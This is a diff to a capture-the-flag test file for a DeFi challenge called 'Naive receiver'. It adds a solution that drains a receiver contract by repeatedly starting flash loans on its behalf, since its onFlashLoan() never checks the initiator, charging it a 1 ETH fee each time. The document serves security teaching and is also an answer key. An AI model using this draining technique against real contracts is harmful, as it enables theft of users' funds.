@@ -37,7 +37,12 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The receiver's `onFlashLoan()` function does not check the initiator of the flashloan. So we
+        // can drain the account by executing dummy flash loans, each time taking away 1 eth worth of fee.
+        const ETH = await pool.ETH();
+        for (let i = 0; i < 10; ++i) {
+            await pool.flashLoan(receiver.address, ETH, 0, "0x");
+        }
     });
 
     after(async function () {
